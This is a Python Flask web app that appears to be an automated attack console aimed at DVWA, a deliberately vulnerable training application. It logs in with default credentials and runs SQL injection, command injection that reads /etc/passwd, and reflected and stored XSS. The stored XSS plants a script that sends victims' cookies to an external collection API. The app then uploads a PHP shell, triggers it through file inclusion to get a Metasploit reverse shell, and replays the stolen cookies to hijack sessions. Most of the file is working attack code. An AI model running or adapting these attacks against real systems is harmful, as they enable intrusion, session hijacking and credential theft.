from flask import *
import os
import requests
from requests_html import HTMLSession
from bs4 import BeautifulSoup as bs
import uuid

app = Flask(__name__)


@app.route("/")
def portal():
    return render_template('portal.html')


@app.route("/cookie-replay")
def cookie_replay():
    return render_template('cookie-replay.html')


@app.route("/scripts")
def scripts():
    return render_template('scripts.html')


@app.route("/attack", methods=['GET', 'POST'])
# Default dvwa
def attack(username='admin', password='password'):
    # Get form data
    form_data = request.form.to_dict()
    base_url = form_data['base-url']
    print(base_url)

    # SET HEADER INFORMATION ##########
    user_agents = {
        'firefox_mac': 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/85.0',
        'firefox_win': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/85.0',
        'chrome_mac': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
        'chome_win': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
        'safari': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
        'safari_mobile': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
    }
    user_agent = ''
    if form_data['user-agent'] == '1':
        user_agent = user_agents['firefox_mac']
    elif form_data['user-agent'] == '2':
        user_agent = user_agents['chrome_mac']
    elif form_data['user-agent'] == '3':
        user_agent = user_agents['safari_mobile']

    accept_language = 'en-gb'
    accept_encoding = 'gzip, deflate'
    accept = '*/*'
    referer = 'https://google.com'

    headers = {
        'User-Agent': user_agent,
        'Accept-Language': accept_language,
        'Accept-Encoding': accept_encoding,
        'Accept': accept,
        'Referer': referer,
        # 'Connection': 'close'
    }
    payload_cmdi = {
        'ip': '8.8.8.8; cat /etc/passwd | grep -v nologin',
        'Submit': 'Submit'
    }
    # Generate UUID for DynamoDB cookie entry
    xss_uuid = str(uuid.uuid4())
    apigw_base_url = os.environ.get("WEB_STEALER_BASE_API")
    web_stealer_code = f"Neil Buchanan IS Banksy!<script>new Image().src='{apigw_base_url}gimme/?source={base_url}&uuid={xss_uuid}&cookie='+ encodeURIComponent(document.cookie);</script>"
    payload_xss_s = {
        'txtName': '1337',
        'mtxMessage': web_stealer_code,
        'btnSign': 'Sign Guestbook'
    }
    dvwa_sqli_1 = '/vulnerabilities/sqli/?id=%27+OR+1%3D1%23&Submit=Submit'
    dvwa_cmdi_path = '/vulnerabilities/exec/'
    dvwa_xss_r_path = '/vulnerabilities/xss_r/?name=<script>alert%28document.cookie%29<%2Fscript>'
    dvwa_xss_s_path = '/vulnerabilities/xss_s/'
    dvwa_file_upload_path = '/vulnerabilities/upload/'
    dvwa_lfi_shell_path = f'{base_url}/vulnerabilities/fi/?page=../../../../../../../../var/www/html/hackable/uploads/shell.php'

    # with requests.Session() as s:
    with HTMLSession() as s:
        try:
            attack_complete = False
            # Load page to get CSRF token
            # For some reason when we set a custom header other than what's used bt HTMLSession, there are issues with the session cookie. To debug
            # s.headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8'
            print(s.headers)
            site = s.get(base_url)
            # s.headers.update(headers)
            bs_content = bs(site.content, "html.parser")
            token = bs_content.find("input", {"name": "user_token"})["value"]
            login_data = {"username": username, "password": password, "user_token": token, "Login": "Login"}
            # Log in using creds/token
            site = s.post(base_url + "/login.php", login_data)

            # SQL Injection #######
            r_sqli = s.get(base_url + dvwa_sqli_1)
            bs_content = bs(r_sqli.content, "html.parser")
            sqli_output = bs_content.find(class_='vulnerable_code_area')
            # Grab the <pre> elements
            pre_elems = sqli_output.find_all('pre')
            sql_inj_output = []
            # Add text from elements to List
            for elem in pre_elems:
                sql_inj_output.append(elem.text)

            # CMD Injection ######
            r_cmdi = s.post(base_url + dvwa_cmdi_path, payload_cmdi)
            bs_content = bs(r_cmdi.content, "html.parser")
            cmdi_output = bs_content.find(class_='vulnerable_code_area')
            # Grab the <pre> elements
            pre_elems = cmdi_output.find('pre')
            cmd_inj_output = pre_elems.text

            # Reflected XSS #####
            # This won't provide any output but will trigger WAF
            s.post(base_url + dvwa_xss_r_path)

            # Stored XSS #####
            r_xss_post = s.post(base_url + dvwa_xss_s_path, payload_xss_s)
            r_xss_s = s.get(base_url + dvwa_xss_s_path)
            bs_content = bs(r_xss_s.content, "html.parser")
            xss_s_output = bs_content.find(id='guestbook_comments')

            # Upload shell PHP file #####
            files = {'uploaded': open('./static/shell.php', 'rb')}
            payload_file_upload = {
                'Upload': 'Upload',
                'MAX_FILE_SIZE': '100000'
            }
            r_file_upload = s.post(base_url + dvwa_file_upload_path, data=payload_file_upload, files=files)
            bs_content = bs(r_file_upload.content, "html.parser")
            file_upload_output = bs_content.find('pre')
            file_upload_output = file_upload_output.text
            # Now to run the shellcode ** REMEMBER TO START MSF LISTENER #####
            # Hacky way to hand off the session otherwise app-attack hangs
            try:
                s.get(dvwa_lfi_shell_path, timeout=5)
            except requests.exceptions.ReadTimeout:
                pass

            attack_complete = True

        except:
            sql_inj_output = ''
            cmd_inj_output = ''
            xss_s_output = ''
            file_upload_output = ''
            attack_complete = False
            xss_uuid = ''

        return render_template('portal.html', sql_inj_output=sql_inj_output, cmd_inj_output=cmd_inj_output,
                               xss_s_output=xss_s_output,
                               file_upload_output=file_upload_output,
                               attack_complete=attack_complete,
                               xss_uuid=xss_uuid)


@app.route("/cookie-attack", methods=['GET', 'POST'])
def cookie_attack():
    apigw_base_url = os.environ.get("WEB_STEALER_BASE_API")
    apigw_filter_cookie = 'checkit/?uuid='

    # Get form data
    form_data = request.form.to_dict()
    cookie_uuid = form_data['cookie-uuid']
    api_call = apigw_base_url + apigw_filter_cookie + cookie_uuid

    r = requests.get(api_call)
    cookies = r.json()['Items'][0]['cookie']['S']

    return render_template('cookie-replay.html', cookies=cookies)


@app.route("/cookie-blastoff", methods=['GET', 'POST'])
def cookie_blastoff():
    # Get form data
    form_data = request.form.to_dict()
    url = form_data['url']
    cookies = form_data['cookie-header']
    # Cookies exist separated by semicolon and then kv pairs separated by =
    # We need to split the cookies up twice then put back into a proper dict
    cookies_list = cookies.rsplit('; ')
    cookies_dict = {}
    for c in cookies_list:
        key_val_list = c.rsplit('=')
        cookies_dict.update({key_val_list[0]: key_val_list[1]})

    r = requests.get(url, cookies=cookies_dict)
    print(r.headers)
    bs_content = bs(r.content, "html.parser")
    body = bs_content.find('body')
    body_contents_arr = body.findChildren(recursive=False)
    body_contents = body_contents_arr[0]
    print(body_contents)

    return render_template('cookie-replay.html', html=body_contents)


if __name__ == "__main__":
    app.run(host='0.0.0.0')
